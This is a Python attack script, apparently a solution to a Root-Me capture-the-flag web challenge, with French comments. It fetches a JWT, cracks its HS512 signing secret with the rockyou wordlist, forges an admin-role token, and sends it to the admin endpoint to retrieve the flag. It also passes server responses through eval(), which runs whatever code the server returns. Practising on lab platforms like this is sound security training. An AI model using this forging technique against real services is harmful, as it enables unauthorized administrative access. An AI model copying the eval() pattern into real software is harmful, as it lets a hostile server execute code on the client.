import requests, jwt, sys

session = requests.session()

#Recuperation du token depuis l'hote http://challenge01.root-me.org/web-serveur/ch59/token
host = "http://challenge01.root-me.org/web-serveur/ch59/token"
response = eval(session.get(host).text)  #Changement du resultat retourné de str en dict avec eval
token = response['Here is your token']
print("\n\n[*]Retrieved Token : ", token)
algo = "HS512"
#Crack du token pour retrouver le secret key
wordlist_file = "/usr/share/wordlists/rockyou.txt"
secret_key = ""
with open(wordlist_file, 'r') as file:
    while True:
        word = file.readline().rstrip()
        # print(word)
        payload = jwt.encode({"role":"guest"}, word, algorithm=algo)
        if payload == token:
            secret_key = word
            print("\n\n[*] Secret key found : ", secret_key)
            break
file.close()
if secret_key == "":
    print("[-] Any secret key found !")
    sys.exit()

#Creation d'un nouveau token avec le "role" : "admin"
new_token = jwt.encode({"role":"admin"}, secret_key, algorithm=algo)
print("\n\n[*] New token generated with \"role\" \"admin\" : ", new_token)


#Envoie de nouveau token a l'hote 'http://challenge01.root-me.org/web-serveur/ch59/admin' avec le header 'Authorization': 'Bearer '
host = "http://challenge01.root-me.org/web-serveur/ch59/admin"
header = {'Authorization': 'Bearer ' + new_token}
response = eval(session.post(host, headers=header).text) #Changement du resultat retourné de str en dict avec eval

#Affichage du flag
flag = response["result"].split(":")[1].strip()
print("\n\n[*] The flag is : ", flag)
